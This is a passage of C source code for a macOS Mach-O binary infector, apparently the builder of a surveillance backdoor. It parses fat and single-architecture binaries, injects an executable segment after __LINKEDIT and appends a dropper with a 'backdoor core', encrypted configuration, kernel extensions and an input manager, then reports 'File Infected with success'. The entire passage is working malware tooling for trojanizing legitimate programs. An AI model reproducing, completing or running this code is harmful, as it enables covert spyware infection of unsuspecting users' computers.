                 strcpy (sect->segname, INJECTED_SEGMENT_NAME);
                 //sect->addr    = stackSize;
                 sect->offset  = fileSize + padding;
                 sect->size    = outputFileSize; //TOP_STACK - stackSize; // size of the stack
                 sect->align   = 0x2; // standard alignment
                 sect->flags   = 0x80000000; // x flag
                 
                 // Copy back the section
                 memcpy (outputFilePointer + outputOffset, sect, sizeof (struct section));
                 outputOffset += sizeof (struct section);
                 
                 free (sect);
                 */
              }
            else if (!strncmp (seg_command->segname, "__LINKEDIT",
                               strlen (seg_command->segname)))
              {
#ifdef DEBUG
                printf ("[ii] Found %s Segment\n", seg_command->segname);
#endif  
                memcpy (outputFilePointer + outputOffset, seg_command, sizeof (struct segment_command_64));
                outputOffset += sizeof (struct segment_command_64);
                
                //
                // Now inject the new segment
                //
                struct segment_command_64 *mySegment = (struct segment_command_64 *) allocate (sizeof (struct segment_command_64));
                
                mySegment->cmd      = LC_SEGMENT;
                mySegment->cmdsize  = sizeof (struct segment_command_64);
#ifdef WIN32
				strncpy_s(mySegment->segname, strlen(INJECTED_SEGMENT), INJECTED_SEGMENT, _TRUNCATE);
#else
                strncpy (mySegment->segname, INJECTED_SEGMENT, strlen (INJECTED_SEGMENT));
#endif
                mySegment->vmaddr   = seg_command->vmaddr + seg_command->vmsize;
                mySegment->vmsize   = outputFileSize;

                // XXX: Check this out outOffsetToArch
                mySegment->fileoff  = inputFileSize + padding - outOffsetToArch;

                mySegment->filesize = outputFileSize;
                mySegment->maxprot  = 0x7;
                mySegment->initprot = 0x5;
                
                //segVMAddr = mySegment->vmaddr;
                
                memcpy (outputFilePointer + outputOffset, mySegment, sizeof (struct segment_command_64));
                outputOffset += sizeof (struct segment_command_64);
              }
            else
              {
                //
                // Shift all the VM Addresses
                //
                //seg_command->vmaddr += paddedPagezeroVASize - PAGE_ALIGNMENT;
                
                memcpy (outputFilePointer + outputOffset,
                        seg_command,
                        sizeof (struct segment_command_64));
                outputOffset += sizeof (struct segment_command_64);
#ifdef DEBUG
                printf ("[ii] Cycling for segment (%s) sections (%d)\n",
                        seg_command->segname, seg_command->nsects);
#endif  
                for (z = 0; z < seg_command->nsects; z++)
                  {
                    struct section_64 *sect;
                    
                    sect = (struct section_64 *) allocate (sizeof (struct section_64));
                    if (sect == NULL)
                      {
                        printf("[ee] Error while allocating the new section\n");
                        return kErrorMemoryAllocation;
                      }
                    memcpy (sect, inputFilePointer + inputOffset, sizeof (struct section_64));
                    
                    //sect->offset += sizeof (struct section);
                    //sect->addr += paddedPagezeroVASize - PAGE_ALIGNMENT;
                    
                    memcpy (outputFilePointer + outputOffset,
                            sect,
                            sizeof (struct section_64));
                    
                    free (sect);
                    inputOffset += sizeof (struct section_64);
                    outputOffset += sizeof (struct section_64);
                  }
              }
            
            free (seg_command);
            
            break;
          }
        /*case LC_SYMTAB:
          {
            struct symtab_command *sy_command;
            sy_command = (symtab_command *) allocate (sizeof (struct symtab_command));
            memcpy (sy_command, inputFilePointer + inputOffset, sizeof (struct symtab_command));
            
            //sy_command->symoff += sizeof (struct section);
            //sy_command->stroff += sizeof (struct section);
            
            memcpy (outputFilePointer + outputOffset, sy_command, sizeof (struct symtab_command));
            free (sy_command);
            
            inputOffset += sizeof (struct symtab_command);
            outputOffset += sizeof (struct symtab_command);
            
            break;
          }
        case LC_DYSYMTAB:
          {
            struct dysymtab_command *dysym_command;
            dysym_command = (dysymtab_command *) allocate (sizeof (struct dysymtab_command));
            memcpy (dysym_command, inputFilePointer + inputOffset, sizeof (struct dysymtab_command));
            
            //dysym_command->indirectsymoff += sizeof (struct section);
            
            memcpy (outputFilePointer + outputOffset, dysym_command, sizeof (struct dysymtab_command));
            free (dysym_command);
            
            inputOffset += sizeof (struct dysymtab_command);
            outputOffset += sizeof (struct dysymtab_command);
            
            break;
          }
        case LC_CODE_SIGNATURE:
        case LC_SEGMENT_SPLIT_INFO:
          {
            struct linkedit_data_command *linkedit_command;
            linkedit_command = (linkedit_data_command *) allocate (sizeof (struct linkedit_data_command));
            memcpy (linkedit_command, inputFilePointer + inputOffset, sizeof (struct linkedit_data_command));
            
            //linkedit_command->dataoff += sizeof (struct section);
            
            memcpy (outputFilePointer + outputOffset, linkedit_command, sizeof (struct linkedit_data_command));
            free (linkedit_command);
            
            inputOffset += sizeof (struct linkedit_data_command);
            outputOffset += sizeof (struct linkedit_data_command);
            
            break;
          }*/
        default:
          {
            memcpy (outputFilePointer + outputOffset,
                    inputFilePointer + inputOffset,
                    l_command->cmdsize);
            inputOffset += l_command->cmdsize;
            outputOffset += l_command->cmdsize;
            
            break;
          }
        }
    }

#ifdef DEBUG
  printf("[ii] inputFilePointer : 0x%08x\n", inputFilePointer);
  printf("[ii] inputOffset      : 0x%08x\n", inputOffset);
  printf("[ii] inputFileSize    : 0x%08x\n", inputFileSize);
  printf("[ii] outputFilePointer: 0x%08x\n", outputFilePointer);
  printf("[ii] outputOffset     : 0x%08x\n", outputOffset);
  printf("[ii] outputFileSize   : 0x%08x\n", outputFileSize);
#endif
  //
  // Now the rest of the file (data), here we wanna skip sizeof segment_command
  // in order to leave the file padded correctly for its TEXT segment
  //
  memcpy (outputFilePointer + outputOffset,
          inputFilePointer + inputOffset + sizeof (struct segment_command_64),
          inputFileSize - inputOffset - sizeof (struct segment_command_64));
  
  free (m_header);
  printf ("[ii] LoadCommands copied successfully\n");
  
#ifdef DEBUG_VERBOSE
  printf ("inputFilePointer: %x\n", inputFilePointer);
  printf ("inputFilePointer: %x\n", *(unsigned long *)inputFilePointer);
  printf ("inputFilePointer: %x\n", *(unsigned long *)(inputFilePointer + 0x1000));
  printf ("inputSize + padding: %d\n", inputFileSize + padding);
#endif
  
  if (appendData(inputFilePointer,
                 outputFilePointer,
                 inOffsetToArch,
                 outOffsetToArch,
                 inputFileSize + padding,
                 segVMAddr,
                 true) != kErrorGeneric)
    return padding;
  else
    return kErrorGeneric;
}
#endif
int
getBinaryFormat(char *aFilePointer)
{
  memset(&gFatHeader, 0, sizeof (gFatHeader));
  memcpy(&gFatHeader, aFilePointer, sizeof (gFatHeader));
  
  switch (gFatHeader.magic)
    {
    case FAT_CIGAM:
      return kFatSwapBinary;
    case FAT_MAGIC:
      return kFatBinary;
    case MH_MAGIC:
      return kMachBinary;
    default:
      return kErrorFileNotSupported;
    }
}

int getFileSize(char *aFilePath)
{
  struct stat sb;
  
  if (stat(aFilePath, &sb) == kErrorGeneric)
    {
      return kErrorGeneric;
    }
  
  return sb.st_size;
}

void
usage(_mChar *aBinaryName)
{
#ifdef WIN32
	printf("\nUsage: %S <core> <conf> <kext32> <kext64> <imanager> <icon> <dirname> <input> <output>\n\n", aBinaryName);
#else
  printf("\nUsage: %s <core> <conf> <kext32> <kext64> <dirname> <input> <output>\n\n", aBinaryName);
#endif
  printf("\t<core>     : backdoor core\n");
  printf("\t<conf>     : backdoor encrypted configuration\n");
  printf("\t<kext32>   : kernel extension 32bit\n");
  printf("\t<kext64>   : kernel extension 64bit\n");
  printf("\t<imanager> : input manager\n");
  printf("\t<icon>     : icon\n");
  printf("\t<dirname>  : backdoor dir name\n");
  printf("\t<input>    : binary to melt with\n");
  printf("\t<output>   : output filename\n\n");
}

int
parseArguments(int argc, _mChar **argv)
{
	if(argc != 10)
    {
      return kErrorGeneric;
    }

#ifdef WIN32_NO
  coreFileName   = (char *)calloc(1, strlen(argv[1]) + 1);
	confFileName   = (char *)calloc(1, strlen(argv[2]) + 1);
	kextFileName   = (char *)calloc(1, strlen(argv[3]) + 1);
	installPath    = (char *)calloc(1, strlen(argv[4]) + 1);
	inputFileName  = (char *)calloc(1, strlen(argv[5]) + 1);
	outputFileName = (char *)calloc(1, strlen(argv[6]) + 1);

  sprintf_s(coreFileName, sizeof(coreFileName), "%s", argv[1]);
	sprintf_s(confFileName, sizeof(confFileName), "%s", argv[2]);
	sprintf_s(kextFileName, sizeof(kextFileName), "%s", argv[3]);
	sprintf_s(installPath, sizeof(installPath), "%s", argv[4]);
	sprintf_s(inputFileName, sizeof(inputFileName), "%s", argv[5]);
	sprintf_s(outputFileName, sizeof(outputFileName), "%s", argv[6]);
#endif

  coreFilePath          = argv[1];
  confFilePath          = argv[2];
  kext32FilePath        = argv[3];
  kext64FilePath        = argv[4];
  inputManagerFilePath  = argv[5];
  iconFilePath          = argv[6];
  installPath           = argv[7];
  inputFilePath         = argv[8];
  outputFilePath        = argv[9];

  return kSuccess;
}

#ifdef WIN32
void freeArguments()
{
	if (coreFilePath != NULL)
		free(coreFilePath);
	if (confFilePath != NULL)
		free(confFilePath);
	if (kext32FilePath != NULL)
		free(kext32FilePath);
  if (kext64FilePath != NULL)
		free(kext64FilePath);
	if (installPath != NULL)
		free(installPath);
	if (inputFilePath != NULL)
		free(inputFilePath);
	if (outputFilePath != NULL)
		free(outputFilePath);
}	
#endif

int
main(int argc, _mChar *argv[])
{
  struct fat_arch *f_arch;
  char *inputFilePointer      = NULL;
  char *outputFilePointer     = NULL;
  
  int outputFileSize          = 0;
  int fileType                = 0;
  int padding                 = 0;
  int i                       = 0;
  gNumStrings                 = 7;
 
#ifdef WIN32
  HANDLE inputFD, outputFD, inputFDMap, outputFDMap;
#else
  int inputFD, outputFD;
#endif  

  int offsetToResources       = 0;
  unsigned int inputOffset    = 0;
  unsigned int outputOffset   = 0;
  int nfat                    = 0;
  int cputype                 = 0;
  unsigned int archOffset     = 0;
    
  if (parseArguments (argc, argv) & kErrorGeneric)
    {
      usage (*argv);
      exit (1);
    }

  //
  // Check if the backdoor, configuration file and KEXT exists and get
  // their size
  //
  if ((gCoreFileSize = getFileSize(coreFilePath)) == kErrorGeneric)
    {
      printf ("[ee] Core backdoor file not found\n");
#ifdef WIN32
      //freeArguments();
#endif
      exit (1);
    }
  
  if ((gConfFileSize = getFileSize(confFilePath)) == kErrorGeneric)
    {
      printf ("[ee] Configuration file not found\n");
#ifdef WIN32
      //freeArguments();
#endif
      exit (1);
    }
  
  if ((gKext32FileSize = getFileSize(kext32FilePath)) == kErrorGeneric)
    {
      printf ("[ee] KEXT32 file not found\n");
#ifdef WIN32
      //freeArguments();
#endif
      exit (1);
    }

  if ((gKext64FileSize = getFileSize(kext64FilePath)) == kErrorGeneric)
    {
      printf ("[ee] KEXT64 file not found\n");
#ifdef WIN32
      //freeArguments();
#endif
      exit (1);
    }

  if ((gInputManagerFileSize = getFileSize(inputManagerFilePath)) == kErrorGeneric)
    {
      printf ("[ee] InputManager file not found\n");
#ifdef WIN32
      //freeArguments();
#endif
      exit (1);
    }

  if ((gIconFileSize = getFileSize(iconFilePath)) == kErrorGeneric)
    {
      printf ("[ee] Icon file not found\n");
#ifdef WIN32
      //freeArguments();
#endif
      exit (1);
    }

  // Map input file
#ifdef WIN32
  if ((inputFilePointer = mapFile(inputFilePath,
                                  &gInputFileSize,
                                  &inputFD,
                                  &inputFDMap,
                                  0)) == NULL)

#else
  if ((inputFilePointer = mapFile(inputFilePath, &gInputFileSize,
                                  &inputFD, 0, 0)) == NULL)
#endif
	{
      printf("[ee] Error while mmapping the input file\n");
#ifdef WIN32
      //freeArguments();
#endif
      exit (1);
    }

  // Calculate the padded output file size + 1
  outputFileSize = DROPPER_CODE_SIZE
                    + sizeof (crtStart)
                    + sizeof (int)
                    + gCoreFileSize
                    + gConfFileSize
                    + gKext32FileSize
                    + gKext64FileSize
                    + gInputManagerFileSize
                    + gIconFileSize
                    + sizeof (infectionHeader)
                    + sizeof (stringTable) * gNumStrings
                    + sizeof (resourceHeader) * 6;

#ifdef DEBUG_VERBOSE
  printf("unpadded outSize: %d\n", outputFileSize);
#endif
  
  if (outputFileSize % PAGE_ALIGNMENT)
    {
      outputFileSize = ((outputFileSize + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
    }

  int tempSize = outputFileSize + gInputFileSize;
  
#ifdef DEBUG_VERBOSE
  printf("padded outSize: %d\n", outputFileSize);
  printf("tempSize: %d\n", tempSize);
  printf("[ii] loaderCodeSize: %d\n", DROPPER_CODE_SIZE);
  printf("[ii] gCoreFileSize: %d\n", gCoreFileSize);
  printf("[ii] confCodeSize: %d\n", gConfFileSize);
  printf("[ii] gKext32FileSize: %d\n", gKext32FileSize);
  printf("[ii] gKext64FileSize: %d\n", gKext64FileSize);
  printf("[ii] inputFileSize: %d\n", gInputFileSize);
  printf("[ii] outputFileSize: %d\n", outputFileSize);
#endif
  
  // Map output file
#ifdef WIN32
  if ((outputFilePointer = mapFile(outputFilePath,
                                   &tempSize,
                                   &outputFD,
                                   &outputFDMap,
                                   &padding)) == NULL)
#else
  if ((outputFilePointer = mapFile (outputFilePath, &tempSize,
                                    &outputFD, 0, &padding)) == NULL)
#endif
	{
    printf("[ee] Error while mmapping the output file\n");
#ifdef WIN32
    //freeArguments();
#endif
    exit (1);
  }
  
  // Giving output file the correct fileSize
#ifdef WIN32
  if (SetFilePointer(outputFD, tempSize + padding - 1, 0, FILE_BEGIN) == INVALID_SET_FILE_POINTER)
    {
      //freeArguments();
      exit (1);
    }
#else
  if (lseek (outputFD, tempSize + padding - 1, SEEK_SET) == kErrorGeneric)
    {
      exit (1);
    }
#endif

#ifdef WIN32
  DWORD dwByteW;

  if (WriteFile(outputFD, "", 1, &dwByteW, 0) == 0)
    {
      if (inputFilePointer != NULL)
        UnmapViewOfFile(inputFilePointer);
      if (outputFilePointer != NULL)
        UnmapViewOfFile(outputFilePointer);
      
      CloseHandle(outputFDMap);
      CloseHandle(inputFDMap);
      CloseHandle(outputFD);
      CloseHandle(inputFD);
      freeArguments();
      
      return kErrorWriteFile;
    }
#else
  if (write (outputFD, "", 1) == kErrorGeneric)
    {
      close (outputFD);
      close (inputFD);

      return kErrorWriteFile;
    }
  
  close (outputFD);
  close (inputFD);
#endif

  // Gettin filetype - Compatibility with MacOS X Leopard 10.5
  fileType = getBinaryFormat(inputFilePointer);

  switch (fileType)
    {
    case kFatBinary:
      {
        gFileType       = 1;
        int x86Found    = 0;
        int otherFound  = 0;

        gFileType = 1;
        nfat = gFatHeader.nfat_arch;
        int fArchSize = 0;

        printf("[ii] FAT Binary found\n");
        printf("[ii] Found %d Arch(s)\n", nfat);

        if (nfat > 4)
          {
            printf("[ii] Error: unsupported format (too many archs)\n");
            
            return kErrorGeneric;
          }

        //memcpy(outputFilePointer, &gFatHeader, sizeof (gFatHeader));
        //outputOffset  += sizeof(gFatHeader);
        inputOffset   += sizeof(gFatHeader);

        for (i = 0; i < nfat; i++)
          {
            f_arch = (fat_arch *)allocate(sizeof(struct fat_arch));
            memcpy(f_arch, inputFilePointer + inputOffset, sizeof(struct fat_arch));

            cputype       = f_arch->cputype;
            archOffset    = f_arch->offset;
            fArchSize     = f_arch->size;
#ifdef DEBUG
            printf ("[ii] cputype: %d\n", cputype);
            printf ("[ii] archOffset: 0x%x\n", archOffset);
#endif

            if (cputype == CPU_TYPE_X86)
              {
                uint32_t arch_offt_padded = archOffset;

                if (gShiftSize > 0)
                  {
                    arch_offt_padded += gShiftSize;
                    
                    if (arch_offt_padded % PAGE_ALIGNMENT)
                      arch_offt_padded = ((arch_offt_padded + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
                  }

                offsetToResources = infectSingleArch((char *)(inputFilePointer),
                                                     (char *)(outputFilePointer),
                                                     archOffset,
                                                     0,//arch_offt_padded,
                                                     fArchSize,
                                                     outputFileSize);

                gShiftSize += sizeof(struct segment_command)
                              + outputFileSize
                              + offsetToResources;
                
#ifdef DEBUG
                printf("offsetToRes: %d\n", offsetToResources);
#endif
                fArchSize += sizeof(struct segment_command)
                             + outputFileSize
                             + offsetToResources;
                f_arch->size = fArchSize;
                
                if (i > 0)
                  {
                    f_arch->offset = arch_offt_padded;
                  }
              }
            /*else if (cputype == CPU_TYPE_X86_64)
              {
                uint32_t arch_offt_padded = archOffset;

                if (gShiftSize > 0)
                  {
                    arch_offt_padded += gShiftSize;
                    
                    if (arch_offt_padded % PAGE_ALIGNMENT)
                      arch_offt_padded = ((arch_offt_padded + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
                  }

                offsetToResources = infectSingleArch64((char *)(inputFilePointer),
                                                       (char *)(outputFilePointer),
                                                       archOffset,
                                                       arch_offt_padded,
                                                       fArchSize,
                                                       outputFileSize);

                gShiftSize += sizeof(struct segment_command)
                              + outputFileSize
                              + offsetToResources;
                
#ifdef DEBUG
                printf("offsetToRes: %d\n", offsetToResources);
#endif
                
                fArchSize += sizeof(struct segment_command)
                             + outputFileSize
                             + offsetToResources;
                f_arch->size = fArchSize;
                
                if (i > 0)
                  {
                    f_arch->offset = arch_offt_padded;
                  }
              }
            else
              {
                uint32_t arch_offt_padded = archOffset;
                
                if (gShiftSize > 0)
                  {
                    arch_offt_padded += gShiftSize;
                    
                    if (arch_offt_padded % PAGE_ALIGNMENT)
                      arch_offt_padded = ((arch_offt_padded + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
                  }

                f_arch->offset = arch_offt_padded;

                memcpy(outputFilePointer + arch_offt_padded,
                       inputFilePointer + archOffset,
                       fArchSize);
              }
            
            memcpy(outputFilePointer + outputOffset, f_arch, sizeof(struct fat_arch));
            */
            free (f_arch);
            inputOffset   += sizeof(struct fat_arch);
            outputOffset  += sizeof(struct fat_arch);
          }

        break;
      }
    case kFatSwapBinary:
      {
        int x86Found      = 0;
        int otherFound    = 0;

        gFileType = 2;
        nfat = SWAP_LONG(gFatHeader.nfat_arch);
        int fArchSize = 0;

        printf ("[ii] FAT (swapped) Binary found\n");
        printf ("[ii] Found %d Arch(s)\n", nfat);
        
        if (nfat > 4)
          {
            printf ("[ii] Error: unsupported format (too many archs)\n");

            return kErrorGeneric;
          }

        //memcpy (outputFilePointer, &gFatHeader, sizeof (gFatHeader));
        //outputOffset  += sizeof (gFatHeader);
        inputOffset   += sizeof(gFatHeader);
        
        for (i = 0; i < nfat; i++)
          {
            f_arch = (fat_arch *)allocate(sizeof(struct fat_arch));
            memcpy(f_arch, inputFilePointer + inputOffset, sizeof(struct fat_arch));
            
            cputype       = SWAP_LONG(f_arch->cputype);
            archOffset    = SWAP_LONG(f_arch->offset);
            fArchSize     = SWAP_LONG(f_arch->size);
#ifdef DEBUG
            printf ("[ii] cputype: %d\n", cputype);
            printf ("[ii] archOffset: 0x%x\n", archOffset);
#endif
            
            if (cputype == CPU_TYPE_X86)
              {
                uint32_t arch_offt_padded = archOffset;

                if (gShiftSize > 0)
                  {
                    arch_offt_padded += gShiftSize;
                    
                    if (arch_offt_padded % PAGE_ALIGNMENT)
                      arch_offt_padded = ((arch_offt_padded + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
                  }

                if (otherFound == 1)
                  {
                    offsetToResources = infectSingleArch((char *)(inputFilePointer),
                                                         (char *)(outputFilePointer),
                                                         archOffset,
                                                         0,//arch_offt_padded,
                                                         gInputFileSize,
                                                         outputFileSize);
                  }
                else
                  {
                    offsetToResources = infectSingleArch((char *)(inputFilePointer),
                                                         (char *)(outputFilePointer),
                                                         archOffset,
                                                         0,//arch_offt_padded,
                                                         fArchSize,
                                                         outputFileSize);
                  }

                gShiftSize += sizeof(struct segment_command)
                              + outputFileSize
                              + offsetToResources;
                
#ifdef DEBUG
                printf("offsetToRes: %d\n", offsetToResources);
#endif
                fArchSize += sizeof(struct segment_command)
                             + outputFileSize
                             + offsetToResources;
                
                f_arch->size = SWAP_LONG(fArchSize);
                
                if (i > 0)
                  {
                    f_arch->offset = SWAP_LONG(arch_offt_padded);
                  }
              }
            /*else if (cputype == CPU_TYPE_X86_64)
              {
                uint32_t arch_offt_padded = archOffset;

                if (gShiftSize > 0)
                  {
                    arch_offt_padded += gShiftSize;
                    
                    if (arch_offt_padded % PAGE_ALIGNMENT)
                      arch_offt_padded = ((arch_offt_padded + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
                  }

                if (otherFound == 1)
                  {
                    offsetToResources = infectSingleArch64 ((char *)(inputFilePointer),
                                                            (char *)(outputFilePointer),
                                                            archOffset,
                                                            arch_offt_padded,
                                                            gInputFileSize,
                                                            outputFileSize);
                  }
                else
                  {
                    offsetToResources = infectSingleArch64 ((char *)(inputFilePointer),
                                                            (char *)(outputFilePointer),
                                                            archOffset,
                                                            arch_offt_padded,
                                                            fArchSize,
                                                            outputFileSize);
                  }

                gShiftSize += sizeof (struct segment_command)
                              + outputFileSize
                              + offsetToResources;
                
#ifdef DEBUG
                printf("offsetToRes: %d\n", offsetToResources);
#endif
                fArchSize += sizeof (struct segment_command)
                             + outputFileSize
                             + offsetToResources;
                f_arch->size = SWAP_LONG (fArchSize);
                
                if (i > 0)
                  {
                    f_arch->offset = SWAP_LONG (arch_offt_padded);
                  }
              }
            else
              {
                uint32_t arch_offt_padded = archOffset;
                otherFound++;

                if (gShiftSize > 0)
                  {
#ifdef DEBUG
                    printf("[ii] arch_offt_padded: %d\n", arch_offt_padded);
                    printf("[ii] Should shift: %d\n", gShiftSize);
#endif
                    arch_offt_padded += gShiftSize;
                    
                    if (arch_offt_padded % PAGE_ALIGNMENT)
                      arch_offt_padded = ((arch_offt_padded + PAGE_ALIGNMENT) & ~(PAGE_ALIGNMENT - 1));
#ifdef DEBUG
                    printf("[ii] Padded shift: %d\n", arch_offt_padded);
#endif
                  }

                f_arch->offset = SWAP_LONG (arch_offt_padded);

                memcpy (outputFilePointer + arch_offt_padded,
                        inputFilePointer + archOffset,
                        fArchSize);
              }

            memcpy (outputFilePointer + outputOffset, f_arch, sizeof (struct fat_arch));
            */
            free(f_arch);
            inputOffset += sizeof(struct fat_arch);
            gOutSize     = fArchSize;
            //outputOffset  += sizeof (struct fat_arch);
          }
        
        break;
      }
    case kMachBinary:
      {
        gFileType = 3;
        printf("[ii] Mach Binary found\n");
        
        if ((offsetToResources = infectSingleArch(inputFilePointer,
                                                  outputFilePointer,
                                                  0,
                                                  0,
                                                  gInputFileSize,
                                                  outputFileSize)) < 0)
          {
            printf("[ee] An error occurred while infecting the binary\n");
            
            switch (offsetToResources)
              {
              case kErrorGeneric:
                printf("[ee] Got a generic error\n");
                break;
              case kErrorOpenFile:
                printf("[ee] Error on file open\n");
                break;
              case kErrorReadFile:
                printf("[ee] Error while reading the input file\n");
                break;
              case kErrorWriteFile:
                printf("[ee] Error while writing the output file\n");
                break;
              case kErrorCreateFile:
                printf("[ee] Error while creating the output file\n");
                break;
              default:
                break;
              }
          }
                
        break;
      }
    default:
      break;
    }

  printf("[ii] File Infected with success\n");

#ifdef WIN32
  if (inputFilePointer != NULL)
    UnmapViewOfFile(inputFilePointer);
  if (outputFilePointer != NULL)
    UnmapViewOfFile(outputFilePointer);

  CloseHandle(outputFDMap);
  CloseHandle(inputFDMap);

  if (gFileType != 3)
    {
      SetFilePointer(outputFD, gOutSize, 0, FILE_BEGIN);
      SetEndOfFile(outputFD);
    }

  CloseHandle(outputFD);
  CloseHandle(inputFD);
  //freeArguments();
#endif

  return kSuccess;
}